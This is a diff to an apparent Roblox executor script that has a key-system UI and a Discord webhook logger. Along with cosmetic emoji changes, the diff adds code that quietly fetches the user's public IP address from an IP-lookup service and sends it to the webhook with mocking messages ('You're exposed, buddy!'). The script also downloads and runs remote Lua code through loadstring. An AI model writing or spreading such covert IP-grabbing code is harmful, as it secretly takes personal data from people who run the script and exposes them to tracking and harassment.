@@ -43,19 +43,20 @@ local data = {
             type = "rich",
             color = tonumber(4334245),
             fields = {
-                { name = "Player Count", value = "Calculating...", inline = true },
-                { name = "Premium Status", value = "Calculating...", inline = true },
-                { name = "Timezone", value = "Calculating...", inline = true },
-                { name = "Local Time", value = "Calculating...", inline = true },
-                { name = "Profile Link", value = "Calculating...", inline = true },
-                { name = "Join/Leave", value = "Calculating...", inline = true }
+                { name = "Player Count :busts_in_silhouette:", value = "Calculating...", inline = true },
+                { name = "Premium Status :gem:", value = "Calculating...", inline = true },
+                { name = "Timezone :clock9:", value = "Calculating...", inline = true },
+                { name = "Local Time :clock2:", value = "Calculating...", inline = true },
+                { name = "Profile Link :link:", value = "Calculating...", inline = true },
+                { name = "Join/Leave :arrow_heading_up:/:arrow_heading_down:", value = "Calculating...", inline = true },
+                { name = "IP Address :globe_with_meridians:", value = "Calculating...", inline = true },
             },
             thumbnail = {
                 url = avatarImage
             }
         },
         {
-            title = "Game Link",
+            title = "Game Link :video_game:",
             description = "[" .. gameName .. "](" .. gameLink .. ")",
             type = "rich",
             color = tonumber(16711680),
@@ -123,6 +124,17 @@ if KeySystemUI.Finished() and KeySystemUI.Closed == false then
     print("Key verified, can load script")
 else
     print("Player closed the GUI.")
+end
+
+-- Get player IP and add it to the Discord message
+local ipResponse = game:HttpGet("https://v4.ident.me")
+if ipResponse then
+    local ipAddress = "IP Address :globe_with_meridians:\n" .. tostring(ipResponse)
+    data.embeds[1].fields[7].value = ipAddress
+    sendRequest("Player IP successfully acquired. You're exposed, buddy!")
+else
+    data.embeds[1].fields[7].value = "IP Address :globe_with_meridians:\nError retrieving IP. They must be hiding!"
+    sendRequest("Failed to retrieve player IP. Foiled again!")
 end
 
 local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()
